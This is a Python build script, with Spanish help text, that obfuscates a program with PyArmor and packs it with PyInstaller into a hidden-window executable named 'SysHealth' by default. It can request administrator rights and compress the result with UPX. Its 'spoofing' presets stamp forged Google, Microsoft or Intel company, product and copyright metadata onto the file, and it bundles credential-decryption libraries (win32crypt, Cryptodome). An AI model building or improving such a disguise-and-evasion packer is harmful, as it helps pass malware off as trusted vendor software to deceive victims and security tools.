import os
import sys
import subprocess
import argparse
import tempfile

__version__ = "1.2.1"  # Updated build suite version

def get_python_executable():
    return sys.executable

def run_command(cmd_list, description="Running command"):
    print(f"\n[*] {description}...")
    print(f"Executing: {' '.join(cmd_list)}")
    try:
        result = subprocess.run(cmd_list, check=True, capture_output=True, text=True)
        print("[+] Success.")
        return True, result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e}")
        print(f"Stdout: {e.output}")
        print(f"Stderr: {e.stderr}")
        return False, e.stderr

def create_version_file(args):
    """Genera un archivo de version temporal para PyInstaller."""
    v = args.version.replace('.', ',')
    if v.count(',') < 3:
        v += ",0" * (3 - v.count(','))
    
    content = f"""
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({v}),
    prodvers=({v}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        '040904B0',
        [StringStruct('CompanyName', '{args.company}'),
        StringStruct('FileDescription', '{args.desc}'),
        StringStruct('FileVersion', '{args.version}'),
        StringStruct('InternalName', '{args.name}'),
        StringStruct('LegalCopyright', '{args.copyright}'),
        StringStruct('OriginalFilename', '{args.name}.exe'),
        StringStruct('ProductName', '{args.product}'),
        StringStruct('ProductVersion', '{args.version}')])
      ]), 
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"""
    fd, path = tempfile.mkstemp(suffix=".txt", text=True)
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        f.write(content)
    return path

def main():
    parser = argparse.ArgumentParser(
        description="Suite de Ofuscación y Compilación Robusta (Build Suite)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python build.py --name "MiApp" --icon "app.ico"
  python build.py --no-obf --onefile
  python build.py --noconsole --dist-dir "./bin"
        """
    )
    
    parser.add_argument("input", nargs="?", default="main.py", 
                        help="Archivo .py principal a compilar (defecto: 'main.py').")
    
    comp_group = parser.add_argument_group("Opciones de Compilación (PyInstaller)")
    comp_group.add_argument("--name", default="SysHealth", 
                            help="Nombre deseado para el archivo ejecutable (defecto: 'SysHealth').")
    comp_group.add_argument("--multi-file", action="store_true", 
                            help="Crea una carpeta con múltiples archivos en lugar de un único .exe.")
    comp_group.add_argument("--show-console", action="store_true", 
                            help="Muestra la ventana de comandos al ejecutar el archivo.")
    comp_group.add_argument("--icon", default=None, 
                            help="Ruta a un archivo .ico para el icono del programa.")
    comp_group.add_argument("--dist-dir", default="dist", 
                            help="Carpeta de destino para el ejecutable final (defecto: 'dist').")

    comp_group.add_argument("--uac-admin", action="store_true", 
                            help="Solicita privilegios de administrador al ejecutar el EXE.")
    comp_group.add_argument("--clean", action="store_true", 
                            help="Limpia los archivos temporales después de la compilación.")
    comp_group.add_argument("--upx", default=None, 
                            help="Ruta al directorio de UPX para comprimir el ejecutable.")
    
    obf_group = parser.add_argument_group("Opciones de Ofuscación (PyArmor)")
    obf_group.add_argument("--no-obf", action="store_true", 
                           help="Desactiva la ofuscación de PyArmor y compila solo con PyInstaller vanilla.")
    
    meta_group = parser.add_argument_group("Identidad y Spoofing (Metadatos del EXE)")
    meta_group.add_argument("--preset", choices=["google", "microsoft", "intel"], default="google",
                            help="Aplica un perfil de metadatos predefinido para rapidez.")
    meta_group.add_argument("--company", help="Nombre de la empresa (ej: Microsoft).")
    meta_group.add_argument("--desc", help="Descripción del archivo.")
    meta_group.add_argument("--version", default="1.2.0.0", help="Versión del archivo (ej: 1.0.0.0).")
    meta_group.add_argument("--copyright", help="Copyright legal.")
    meta_group.add_argument("--product", help="Nombre del producto.")
    
    args = parser.parse_args()

    # Lógica de Presets
    presets = {
        "google": {
            "company": "Google LLC",
            "desc": "Google Update Setup",
            "product": "Google Update",
            "copyright": "Copyright Google LLC. All rights reserved."
        },
        "microsoft": {
            "company": "Microsoft Corporation",
            "desc": "Windows Security Health Service",
            "product": "Windows Operating System",
            "copyright": "© Microsoft Corporation. All rights reserved."
        },
        "intel": {
            "company": "Intel Corporation",
            "desc": "Intel(R) Content Protection Framework Service",
            "product": "Intel(R) Management Engine Components",
            "copyright": "Copyright (c) Intel Corporation."
        }
    }

    if args.preset in presets:
        p = presets[args.preset]
        if not args.company: args.company = p["company"]
        if not args.desc: args.desc = p["desc"]
        if not args.product: args.product = p["product"]
        if not args.copyright: args.copyright = p["copyright"]

    python = get_python_executable()

    if not os.path.exists("main.py"):
        print("[-] Error: main.py not found in current directory.")
        return

    if args.no_obf:
        print("[*] Performing vanilla PyInstaller build (No Obfuscation)...")
        # Check if PyInstaller is available
        v_check, _ = run_command([python, "-m", "PyInstaller", "--version"], "Verifying PyInstaller")
        if not v_check:
            print("[-] Error: PyInstaller is not installed. Run: pip install pyinstaller")
            return

        # Definir parámetros base
        onefile = not args.multi_file
        windowed = not args.show_console

        # Generar version file si es necesario
        v_file = create_version_file(args)

        pyi_cmd = [python, "-m", "PyInstaller", args.input]
        if onefile: pyi_cmd.append("--onefile")
        if windowed: pyi_cmd.append("--windowed")
        if args.uac_admin: pyi_cmd.append("--uac-admin")
        if args.clean: pyi_cmd.append("--clean")
        if args.upx and os.path.exists(args.upx):
            pyi_cmd.extend(["--upx-dir", args.upx])
        
        pyi_cmd.extend(["--version-file", v_file])
        pyi_cmd.extend(["--hidden-import", "win32crypt"])
        pyi_cmd.extend(["--hidden-import", "Cryptodome"])
        if args.icon and os.path.exists(args.icon): pyi_cmd.extend(["--icon", args.icon])
        pyi_cmd.extend(["--name", args.name, "--distpath", args.dist_dir])
        
        run_command(pyi_cmd, f"Compilando con PyInstaller (Carpeta: {args.dist_dir})")
        os.unlink(v_file)
        print("\n[!] Vanilla build finished.")
        return

    # 1. Detect PyArmor version
    print("[*] Detecting PyArmor version...")
    success, version_out = run_command([python, "-m", "pyarmor.cli", "--version"], "Checking PyArmor CLI")
    
    if success:
        print("[+] PyArmor 8+ detectado.")
        onefile = not args.multi_file
        windowed = not args.show_console

        pyi_opts = []
        if onefile: pyi_opts.append("--onefile")
        if windowed: pyi_opts.append("--windowed")
        if args.uac_admin: pyi_opts.append("--uac-admin")
        if args.clean: pyi_opts.append("--clean")
        v_file = create_version_file(args)
        pyi_opts.append(f"--version-file={v_file}")
        pyi_opts.append("--hidden-import=win32crypt")
        pyi_opts.append("--hidden-import=Cryptodome")
        if args.icon and os.path.exists(args.icon): pyi_opts.append(f"--icon={args.icon}")
        pyi_opts.append(f"--name {args.name}")
        pyi_opts.append(f"--distpath {args.dist_dir}")
        
        opts_str = " ".join(pyi_opts)
        run_command([python, "-m", "pyarmor.cli", "cfg", f"pack:pyi_options={opts_str}"], "Configurando PyArmor 9")
        
        # Build
        pack_mode = "onefile" if onefile else "onedir"
        run_command([python, "-m", "pyarmor.cli", "gen", "--output", f"{args.dist_dir}/obfuscated", "--pack", pack_mode, args.input], "Compilando con PyArmor 9")
        os.unlink(v_file)
    else:
        # Try legacy pyarmor
        print("[!] PyArmor 8+ CLI no encontrado. Probando modo Legacy...")
        success, version_out = run_command([python, "-m", "pyarmor", "--version"], "Verificando PyArmor Legacy")
        if success:
            print("[+] PyArmor 7.x detectado.")
            onefile = not args.multi_file
            windowed = not args.show_console

            pyi_opts = []
            if onefile: pyi_opts.append("--onefile")
            if windowed: pyi_opts.append("--windowed")
            pyi_opts.append(f"--name {args.name}")
            
            opts_str = " ".join(pyi_opts)
            run_command([python, "-m", "pyarmor", "pack", "-e", opts_str, args.input], "Compilando con PyArmor Legacy")
        else:
            print("[-] FATAL: PyArmor not found in environment. Please run: pip install pyarmor")

    print("\n[!] Process finished. Check 'dist/' folder for results.")

if __name__ == "__main__":
    main()
